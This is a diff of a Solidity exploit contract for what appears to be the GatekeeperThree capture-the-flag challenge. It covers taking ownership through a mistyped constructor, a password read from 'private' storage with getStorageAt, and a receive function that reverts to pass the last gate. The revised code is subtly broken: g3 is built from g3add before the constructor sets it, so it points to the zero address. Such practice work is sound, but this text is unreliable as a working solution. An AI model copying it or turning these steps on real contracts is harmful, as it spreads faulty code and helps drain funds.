@@ -1,19 +1,35 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-// HackCode
+/// @dev Contract to be deployed to win the challange
 contract Hack {
-  address payable g3add = payable(0x42Ab2Ca5eEeB1e5a369A49142343a797F1e52B7C);
+  address payable g3add;
+  uint256 passwordObtained;
   GatekeeperThree g3 = GatekeeperThree(g3add);
 
-  constructor() payable{}
+  /// @notice send more than 0.001 ether to the contract
+  /// @param _g3add address of gateKeeperThree
+  /// @param _passwordObtained  the value obtained by reading the private variable for gate2
+  constructor(address payable _g3add, bytes memory _passwordObtained) payable{
+    g3add = _g3add;
+
+    /* Solidity doesn't allow conversion from bytes to uint,
+     so extra step of conversion to bytes 32 and then uint256
+    */
+    bytes32 b32 = bytes32(_passwordObtained);
+    passwordObtained = uint256(b32);
+  }
 
   function attack() public {
     // gate 1 -> Become the owner by calling construct0r
     g3.construct0r();
 
-    // Gate 2 -> provide the password
-    g3.getAllowance(uint(0x0000000000000000000000000000000000000000000000000000000064aceb84));
+    /*
+     Gate 2 -> provide the password
+     Password obtain using web3js in the browser console
+     web3.eth.getStorageAt(addressOfTrick, 2)
+    */
+    g3.getAllowance(passwordObtained);
 
     // Gate 3 -> transfer ether
     g3add.transfer(0.0011 ether);
@@ -25,7 +41,7 @@ contract Hack {
     selfdestruct(payable(msg.sender));
   }
 
-  // Gate 3 -> send false
+  // Gate 3 -> Return false
   receive() external payable {
     revert();
   }
